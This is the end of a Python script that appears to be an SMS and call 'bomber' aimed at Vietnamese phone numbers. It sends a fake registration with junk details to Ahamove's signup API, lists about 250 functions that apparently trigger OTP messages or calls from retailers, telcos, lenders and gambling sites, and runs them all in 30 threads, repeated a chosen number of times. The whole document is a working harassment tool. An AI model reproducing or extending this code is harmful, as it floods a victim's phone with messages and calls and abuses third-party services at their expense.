        "priority": "u=1, i",
        "referer": "https://app.ahamove.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    }
    json_data = {
        "mobile": phone,
        "name": "ghyjfgh",
        "email": "lasscma@gmail.cim",
        "country_code": "VN",
        "firebase_sms_auth": "true",
        "time": 1746106029,
        "checksum": "GhNcsBdHqx/+p6pLmnRzVBfqpXXPg0QHet4qgQ3w9QEq4cIhqKLBow8Apa12kbfEiAd9q1S5HwIoB7csagrmDe0Wtn7BKvwpys27R7f3dKFv9LjcAghichjjU0bgmZ0lUvzlXwb7XbQUjg7LThRDluDAH20IKVG2B5ZJFwjpx6Pj3L/0tZhEeUxDaiD9W6i0DYOASi2VWKpqB3fZsOFVqFNXcyDDyLwL4Gq2EBM9fd8pYKV08VPEgimotTJf4iLnqGkW85qk3+V+6YKNmQJ9BLYGYbWei57KDCusNTkrU84nHaSlxkFGWpHOTrrjzb77fbyjVCmTjlJEQKOi1Ftpfg==",
    }
    response = requests.post(
        "https://api.ahamove.com/api/v3/public/user/register",
        headers=headers,
        json=json_data,
    )
functions = [
    tv360, beautybox, kingfood, batdongsan, futabus,
    galaxyplay, hoangphuc, gumac, vinamilk, speedlotte,
    medicare, tokyolife, vieon, fptreg, fptreset, fptresend,
    winmart, tgdidong, dienmayxanh, meta,
    thefaceshop, bestexpress, ghnexpress, myviettel, 
    fptshop, sapo, paynet, reebok, gapowork, shine,
    oreka, fmstyle, circa, acfc, fptlongchauzl,
    thuocsi, pantio, winny, owen, befood, foodhubzl, heyu,
    pantioresend, vttelecom, vinwonders, vietair, vexere, 
    atadi, etrip4u, tinyworld, chudu24, sojo,
    hasaki, kiehls, emart, hanoia, ahamove, fahasa,
    vascara, sablanca, sandro, routine, coolmate, mioto,
    pharmartsms, medigosms, avakids, giathuoctot,
    medigozl, ddmevabereg, pharmartzl, jiohealth, ddmevabe,
    nhathuocankhang, mutosi,
    aha,
    vin,
    ivivu,
    sapo,
    myviettel,
    medicare,
    tv360,
    dienmayxanh,
    longchau,
    kingfoodmart,
    inc,
    mocha,
    vieon,
    hasaki,
    lotte,
    tgdd,
    viettelpost,
    vuihoc,
    jlb,
    eaone,
    tv360,
    myvt,
    vieon,
    goldenspoon,
    goldenspoon1,
    fahasha,
    PNJ,
    PNJ1,
    fptshop,
    bestex,
    vndirect,
    mocha,
    vuihoc,
    hasaki,
    hacom,
    guardian,
    mytv,
    vinwonder,
    viettelpost,
    vtsolution,
    cellphones,
    longchau,
    longchau1,
    ghtk,
    vuanem,
    vuanem1,
    monkeyjunior,
    medigozl,
    jobsgo,
    kymdan,
    liena,
    trungson,
    trungson1,
    vinschool,
    befood,
    prep,
    alf,
    alf1,
    momo,
    safecare,
    vinfastescooter,
    vkids,
    edupia,
    ivnd,
    bibomart,
    Bibabo,
    ViettelMoney,
    fptid,
    aio,
    thoitrang188,
    kkfashion,
    aeshop,
    robot,
    dkimu,
    otpmu,
    lote,
    upos,
    foodmap1,
    thuongdo,
    unicar,
    highlands,
    h5vay,
    gas40,
    finzone,
    pharmart1,
    sigo,
    baoviet,
    truedoc,
    babilala,
    vieclam24h,
    vieon,
    vtmoney,
    best_inc,
    vtpost,
    tv360,
    mobifone,
    myvnpt,
    pizzacompany,
    chotot,
    bhx,
    viettel,
    sunwin,
    hitclb,
    go88,
    gemwwin,
    b52,
    yo88,
    zowin,
    fptshop,
    iloka,
    norifood,
    fa88,
    vhome,
    phuha,
    aemon,
    fptplay,
    savyu,
    b,
    n,
    k,
    call_viettel,
    call_medicare,
    call_tv360,
    call_dienmayxanh,
    call_kingfoodmart,
    call_mocha,
    call_fptdk,
    call_fptmk,
    call_VIEON,
    call_ghn,
    call_lottemart,
    call_DONGCRE,
    call_shopee,
    call_TGDD,
    call_fptshop,
    call_WinMart,
    call_vietloan,
    call_lozi,
    call_F88,
    call_spacet,
    call_vinpearl,
    call_traveloka,
    call_dongplus,
    call_longchau,
    call_longchau1,
    call_galaxyplay,
    call_emartmall,
    call_ahamove,
    call_ViettelMoney,
    call_xanhsmsms,
    call_xanhsmzalo,
    call_popeyes,
    call_ACHECKIN,
    call_APPOTA,
    call_Watsons,
    call_hoangphuc,
    call_fmcomvn,
    call_Reebokvn,
    call_thefaceshop,
    call_BEAUTYBOX,
    call_winmart,
    call_medicare,
    call_futabus,
    call_ViettelPost,
    call_myviettel2,
    call_myviettel3,
    call_TOKYOLIFE,
    call_30shine,
    call_Cathaylife,
    call_dominos,
    call_vinamilk,
    call_vietloan2,
    call_batdongsan,
    call_GUMAC,
    call_mutosi,
    call_mutosi1,
    call_vietair,
    call_FAHASA,
    call_hopiness,
    call_modcha35,
    call_Bibabo,
    call_MOCA,
    call_pantio,
    call_Routine,
    call_vayvnd,
    call_tima,
    call_moneygo,
    call_pico,
    call_PNJ,
    call_TINIWORLD,
    call_BACHHOAXANH,
    call_shbfinance,
    call_mafccomvn,
    call_phuclong,
    call_takomo,
]

def run(phone, count):

    with ThreadPoolExecutor(max_workers=30) as executor:
        for _ in range(count):
            for fn in functions:
                executor.submit(fn, phone)

def main():
    if len(sys.argv) < 3:
        print("Usage: python main.py <phone> <count>")
        print("Example: python main.py 0123456789 5")
        return

    phone = sys.argv[1]
    count = int(sys.argv[2])

    print(f"📱 Phone: {phone}")
    print(f"🔄 Số lần: {count}")
    print("-" * 40)

    for i in range(count):
        print(f"--- Lần {i+1}/{count} ---")
        run(phone, count)
        print("Xong vòng")

if __name__ == "__main__":
    main()
